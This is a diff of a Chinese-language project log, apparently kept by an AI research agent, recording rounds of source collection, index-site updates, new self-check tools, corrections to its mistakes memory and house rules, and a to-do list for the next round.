-→ 三个坑**都不报错、只给好看的结果**，全是负对照照出来的 → 记为 **M-0022**。
-→ 同时把这组正负例**固化进 `_tools/gate_recall_probe.py`**（新增 I1–I4），现在探针覆盖 **8 项（G1-G4 + I1-I4）全绿**。
-
-### 10.4 实测 ④：新增 `_tools/insert_guard_probe.py` —— 把"改 index.html 前的保险"也验了
-M-0020 早就记着"`insert_vN_cards.py` 的四道保护**从未被反例验证过**"。本轮用**真实历史版本**（`git show aee9fa3:index.html`，第十九辑状态）做基准，跑 **6 例**：
-**P1 正例成功（产物 div 平衡 / 末条脚注 r1119 ×1）+ N1 幂等跳过 + N2 页头锚点消失拒绝 + N3 锚点出现 2 次拒绝 + N4 缺 `<section id="s3"` 拒绝 + N5 新卡仓库已存在拒绝 —— 6/6 符合预期。**
-→ 这是本辑**最有元价值的一步**：以后每一版 `insert_vN` 都能用 `--script` 换目标复用。
-
-### 10.5 落地清单（**已改，非声称**）
-| 文件 | 改动 |
-|---|---|
-| `_tools/index_metrics.py` | **新建**（E1–E4 闸门；恒等式 `页头数 == 最大脚注号+1`） |
-| `_tools/insert_guard_probe.py` | **新建**（1 正例 + 5 反例） |
-| `_tools/gate_recall_probe.py` | **扩展**：新增 `index_metrics` 段 I1–I4；修负对照分支语义 |
-| `.workbuddy/memory/mistakes/M-0022-*.yml` + `index.json` | **新建**（22 条） |
-| `agent-house-rules.md` | **47 → 49 条**（+#48 克隆仓库先只读审 MCP 配置 / +#49 回归测试路径必须仍存在） |
-| `game-production-pipeline.md` | **58 → 60 条**（+#59 压缩是替身，原始必须留底 / +#60 记忆写入加只读探针） |
-| `AGENTS.md` | §十 钉子表**加"复核/退役"列** + 加 Copilot 六模型退役的反面案例；§七 加两个新工具指针 |
-| `index.html` | 第二十七版增补 **8 张卡**（1120 → 1128，脚注 [1120]-[1127]），脚本 `insert_v27_cards.py` |
-
-**明确没做的**（不假装）：R7 落地（10.2）、`check_rpy_branches.py`（§7.1）、Foremerge 最小原型（§11.2）、`/skill-doctor` 式"没用的 skill 审计" —— 全部进待办。
+### 9.6 从本轮材料里**真的改了**的两处
+1. **`mistakes/M-0019`（同一个数、不同口径）补第二种形态**：AA v4.3.2 换锚（145 变动 / 128 下降 / 榜首差距凭空 +0.12）
+   + Qwen-Image-2.1 许可证悄悄收窄，判据升级为「**跨时间/跨来源引用必须同时记版本号与数据日期**」；
+   同步加了 `v4.3.2` / `换锚` / `Elo 锚点` 三个检索词与 `index-reanchor-silent-change` 标签，`lastReviewed` 更新为 09-24。
+   （**为什么不新开 M-00NN**：它就是 M-0019 的同族形态，新开等于制造重复 —— 这正是 R6 冲突检测要防的。）
+2. **`agent-house-rules.md` #49 的那行被推翻的实测数字**：改成 R7 复测结果 + 写明勘误，检测器由「R7（待加）」改为「R7（已加）」，
+   并补了一句 R7 的边界（不查命令可跑性）。
+**改后 `memory_health.py` 全绿（R1~R8），R4 四个检索探针仍全部命中。**
 
 ---
 
-## 十一、本辑必须记下的三处「口径相反」
+## 十、索引与文档维护
 
-### 11.1 同一批模型名，两路结论相反 —— **"看着不像真的"不等于"是假的"**
-- **cn 路**：把某论坛《2026 年 9 月 AI 大模型排行榜》判为**"疑似 AI 生成的虚构榜单"**，因为出现了 `Meta Muse Spark 1.3` / `GPT-6 Astra` / `Claude Fable 5` 这些"与主流口径不符"的名字；
-- **official 路**：实测 AA 榜（数据版本 2026-09-22）**Top 5 里就有 `Claude Fable 5.1` / `GPT-6 Astra` / `Muse Spark 1.3`** —— **名字是真的**。
-→ **判定**：cn 路的**剔除动作没错**（该论坛文与 v6/v14/v16 已收内容重合，属重复），但**判据错了** ——
-**"我没见过这个模型名"是知识缺口，不是虚构的证据**。这正是 M-0002「先核实再下结论」的一种新形态：
-**用"与主流不符"当虚构判据，等于把自己的信息滞后当成了对方的错。**
-→ **可迁移判据**：判"虚构"要拿**一手源**（官方发布页 / 权威榜），不能拿**自己的印象**。
+| 文件 | 改动 | 自证 |
+|---|---|---|
+| `index.html` | **1128 → 1141 项**（第二十八版增补 **13 项**，脚本 `insert_v28_cards.py`） | `index_metrics.py`：页头 1141 / 最大脚注 1140 / 卡片 1130 / div **8669 : 8669**；恒等式 ✅；脚本二跑幂等 ✅ |
+| 改 `index.html` 前的保险丝 | `insert_guard_probe.py --base-block 144bbbf:index.html` | **6/6 通过**；⚠️ **本轮它真的拦下一个 `SyntaxError`**（我脚本里多一个右括号，P1/N1 当场失败） |
+| **`csdn-social-summary-v21.md`** | **补建**（49,484 字节，与第二十一辑一致） | ⚠️ **上轮漏做了这一步** —— 第二十一辑直接覆盖了 `csdn-social-summary.md`、没存档。本轮先补建再覆盖 |
+| `agent-house-rules.md` | **294 → 192 行**（砍 24 条；留空号不复用；#49 数字就地更正） | `wc -l` = 192 ≤ 200；四节结构完整；现存 25 条（1/11/13-16/22-25/27-29/31/32/35/40/42-49） |
+| `_tools/memory_health.py` | 加 **R7**（回归路径 8 类分类计数）、**R8**（回注预算）、`--selftest`（10 项） | 自检 10/10；主检查 R1~R8 全绿 |
+| `_tools/arch_boundary_probe.py` | **新建**（架构边界闸门 + 4 组正反例自检） | 自检 4/4 |
+| `mistakes/M-0019` | 补第二种形态 + 检索词 + 标签 + 复核日期 | R1~R8 全绿 |
+| `mistakes/M-0003` / `M-0004` | `path:` 拆成 `path:` + `alsoAppliesTo:` | R7 由 COMPOSITE 2 归零 |
+| `_r22/` | 三路原始产出 + intent 文件 + 主 agent 直查 | 30 / 29（含 5 个 `###` 小节）/ 32 / 2 条 |
 
-### 11.2 "上下文管理"到底值多少 —— 流行说法 vs 实证
-- **流行说法**（§3.3）：压 CLAUDE.md、装命令压缩代理、建代码索引 → **省 82% token**；
-- **实证**（§3.2）：**176 组配置的结论是"上下文管理主要只是防溢出"**，且 **规则化删减 > LLM 摘要**。
-→ **两者不矛盾**：82% 省的是**钱**，防溢出保的是**能不能跑完** ——
-但**不能拿"省了 82%"去暗示"模型因此更强"**。落地时把这两件事分开说。
+**口径提醒（M-0019 同族）**：索引站**页头数（1141）≠ 卡片数（1130）≠ 最大脚注号（1140）** ——
+三套口径并存是**有意的**，恒等式只有一条：**页头数 == 最大脚注号 + 1**。不要为了「看起来一致」去对齐这三个数。
 
-### 11.3 Godot 禁 AI 贡献 vs CESA 85.8% 在用 —— **同一行业，两个方向**
-- **Godot 基金会**：不收 AI 生成代码、不收 AI 写的沟通，理由是**责任**（"无法信任重度使用 AI 的人，理解自己的代码到能修它的程度"）；
-- **CESA 1349 人调查**：**85.8% 开发者已在用**，最普遍的管理方式是"**人确认/修改/审核 + 限定工具 + 不用原样产出**"。
-→ **不矛盾，是同一件事的两端**：**用**是既成事实，**怎么用**才是分歧点。
-Godot 反的不是"用 AI"，反的是"**不理解就交付**"。→ 这条对我们最实用：**我们每一版索引与每一条 `mistakes/` 都应能回答"谁理解了它"**。
-
----
-
-## 十二、索引与文档维护（本辑）
-
-- `index.html` **第二十七版增补 8 张卡**（**1120 → 1128**，脚注 **[1120]-[1127]**），脚本 `insert_v27_cards.py`
-- `agent-house-rules.md` **47 → 49 条**（+#48 / +#49）
-- `game-production-pipeline.md` **58 → 60 条**（+#59 / +#60）
-- `mistakes/` **21 → 22 条**（+M-0022）
-- `AGENTS.md` **126 → ~133 行**：§十 钉子表加"复核/退役"列；§七 加 `index_metrics.py` / `insert_guard_probe.py`
-- 新增工具：`_tools/index_metrics.py` · `_tools/insert_guard_probe.py`（+ 扩展 `gate_recall_probe.py`）
-- 原始调研输出：`_r21/_r21_gh.md`（25 条）· `_r21/_r21_cn.md`（27 条）· `_r21/_r21_official.md`（24 条）
-- ✅ **子 agent 瑕疵已修**：`_r21_gh.md` 曾残留一个**空的 `## 二、（待填）` 骨架小节**（分节时重复了一次），已删除并复核
-  （现 `## 二` 仅 1 处、`（待填）` 0 处、25 条编号条目完整）；
-  `_r21_cn.md` 的"§八 去重报告"里有一处判据错误（见 §11.1）—— **保留原文不改**，作为判据错误的证据。
+**本机上下文预算复测**（`_tools/harness_tax_probe.py`）：调用侧固定前缀 **18,828 token**（上次 20,900），
+其中 **MCP 工具定义 10,519（56%）· 常驻记忆 5,461（29%，已从上轮的 7,721 降下来）· 技能 2,848（15%）** ——
+**最大头仍是 MCP 定义，关掉本次用不到的服务器能砍掉一半。**
 
 ---
 
-## 十三、下一辑待办
+## 十一、下一辑待办
 
-**本辑新增**
-1. **【最高优先】追一手源《DeepSeek Harness：从开机到拆开》（花叔，CC BY-NC-SA 4.0）** —— 被两篇独立引为"一手实测"，本辑未取到 URL
-2. **把 Foremerge 的做法做成最小版**：三路子 agent **开工前先写"我要查什么"到共享文件、收工前先读它** —— 直接治我们"两路重复 / 两路 429"的老毛病（本辑三路已撞过一次 429）
-3. **落 `check_rpy_branches.py`**（§7.1）：解析 `label/jump/call` → 找不可达节点与悬挂跳转 + 覆盖率统计
-4. **`memory_health.py` 加 R7**（§10.2）：`regressionTest.path` 字面路径存在性 → 输出**分类计数**而非直接报红
-5. **顺手修 8 条失效路径**（§10.2）：指向 `amphoreus-roast/` 的改为归档位置或标 `stale: true`
-6. **补 `mistakes/` 的"为什么"字段 + `content_sha256`**（v20 待办 #13 承接）：现在写的是"怎么做"，能跨任务迁移的是**原因**
-7. **给索引站/`mistakes/` 加"是否 AI 生成 / 谁复核"标记**（§11.3 + Godot 政策 + "51% 强制披露"）
-8. **回注 token 预算**（§2.2）：给 `mistakes/` 与 `MEMORY.md` 定一个**回注上限**（社区值是 ≤500 token/次）；当前常驻记忆实测 **4,993 token**
-9. **`/skill-doctor` 式自查**：列出**没被用过的 skill**（本机 19 个技能，`skill_budget` 只测预算不测使用率）
+**最高优先（本轮新增）**
+1. **追 13/14/16 章正文**（怕浪猫 DSH 源码实战：沙箱与执行安全 / 子代理编排 / 构建自己的 dsh 发行版）—— 本辑只取到目录与第 6 章。
+2. **给 14 个「花叔生态」仓库做一次「是否真人关注」核实**（fork/issue/PR 结构，不看 ★）—— `nuwa-skill` 3.3 万星需要解释。
+3. **架构边界闸门换跑法**：现版本证明是对的（自检 4/4），但在 squash 历史 0 命中 → 改成**「提交前跑」或对未 squash 的分支跑**（§9.3）。
+4. **意图文件加时间戳 + 主 agent 先占位**（§9.4 两条改进）；**凡「时间」字段一律脚本打戳或留空**。
+5. **「命令可跑性」检查**（与 R7 分开）：22 条 `regressionTest` 的命令到底几条真能跑（缺 venv / 缺 renpy.exe）—— §9.5 的另一半。
+6. **把 `mistakes/` 的「为什么」字段 + `content_sha256` 不可变版本**做掉（承接两轮了，§9.2 #7）。
+7. **给索引条目 / `mistakes/` 加「最后复核日期 + 是否作废」**（显式标废，不是删行）—— official §3.2 直接给出。
+8. **照 `darwin-skill` 的形状做 `/skill-doctor`**：列出没被用过的 skill + 「评估→测试→保留或回滚」的棘轮（§9.2 #9）。
 
-**承接**
-10. **架构边界闸门**（Frankenstein 效应）—— 欠两轮，仍未建
-11. `rpycdec` 对 1.9 发行包反编译自查（欠四轮）
-12. Codex 本地 `config.yaml` → Ollama 纯离线
-13. DSH 上下文插件二轮评估（等脱离 rc）；本辑新增 **`deepseek-harness-for-vscode` 的 VSIX 路线**与 `dsh-launcher`（Windows 壳）可作替代
-14. **词表落地**：给索引站建 `概念 | HTML class | 页头字段 | 脚注编号 | 约束` 表 —— **本辑已部分完成**（`index_metrics.py` 把三个口径变成 E2 可检查项），**尚缺"概念词表"本身**
-15. 量自己闸门的**召回率**（往已验收版本塞回已知 bug）—— 本辑已扩到 **8 项**，仍未覆盖"技能内容是不是真经验"
+**承接老账**
+9. `rpycdec` 对 1.9 发行包反编译自查（**欠五轮**）。
+10. Codex 本地 `config.yaml` → Ollama 纯离线。
+11. DSH 上下文插件二轮评估（等脱离 rc）；替代路线：`deepseek-harness-for-vscode` VSIX、`dsh-launcher`（Windows 壳）、
+    **本辑新增 `DSH-X`（★419，版本切换 + 插件管理）**。
+12. `check_rpy_branches.py`（Ren'Py 分支死路检测 + 覆盖率统计）。
+13. 词表落地：`概念 | HTML class | 页头字段 | 脚注编号 | 约束`。
+14. 给「模型分档」做显式旋钮（抄 Copilot 三档）+ 记录每次为什么选哪档。
+15. **另一个规则文件也超了自己的上限**：`game-production-pipeline.md` **994 行**（M-0004 说规则/指南 ≤200 行）——
+    房规本辑已砍到 192 行，**下一个该砍它**。**先砍出空间，再谈从本辑材料里加新条款**
+    （§9.6 只回了 memory 侧与房规勘误，**规则侧本辑刻意没加**）。
+16. 索引站**未登记候选池（本辑剩约 29 个）**：gh 路 2 条备选（`tomyud1/godot-mcp` ★434、`ooples/token-optimizer-mcp` ★536）
+    + 明确留待下轮的 `godot-mcp-toolkit` / `MCPJam/inspector` ★2222 + 花叔生态 10 个。
+
+**下轮务必先做**：`github-projects-invest-games` 的**推送**（本辑改动量大，`_tools/push_via_api.py`，git 协议被代理挡）。
 
 ---
 
-*本辑统计*：新增约 **76 条**信源（GitHub·Gitee 25 / 中文社媒 27 / 官方与海外 24）→ 累计约 **741 条**；
-`index.html` **1128** 项（+8）；`agent-house-rules.md` **49** 条（+2）；决策原则 **60** 条（+2）；`mistakes/` **22** 条（+1）；
-新建工具 **2 个**（`index_metrics.py` / `insert_guard_probe.py`）+ 扩展 1 个（`gate_recall_probe.py`）；
-自测抓出并修掉 **3 个真缺陷**（全在自己新写的闸门里，见 M-0022）+ **1 处既有缺陷**（8/22 条回归测试路径失效）；
-**本辑最大单条价值**：把"改 index.html 前的保险丝"从**从未被验证**变成 **6/6 反例通过**。
+*本辑统计*：新增约 **98 条**信源（GitHub 28 + 中文社媒 24 + 官方与海外 32 + 主 agent 直查 14）→ 累计约 **839 条**；
+`index.html` **1141** 项（+13）；`_tools/` **新建 1 个**（`arch_boundary_probe.py`）、扩展 1 个（`memory_health.py` +R7/R8/+自检）；
+`agent-house-rules.md` **294 → 192 行**（现存 25 条）；`mistakes/` **22 条**（改 3 条：M-0019 补形态、M-0003/M-0004 拆字段，**未新增条目**）；
+**自测抓出 4 个真缺陷**（全在自己新写的两个闸门里）+ **1 处上轮误判已推翻**（「虚构榜单」用三处独立信源证伪）
++ **1 处上轮漏做已补**（v21 存档缺失）+ **1 处上轮未复现的说法已更正**（「8 条失效路径」）。
+**本辑最大单条价值**：**追了两轮的一手源闭环；并且「口径」这件事第一次有了可执行的引用规范（版本号 + 数据日期），已写进错误记忆。**
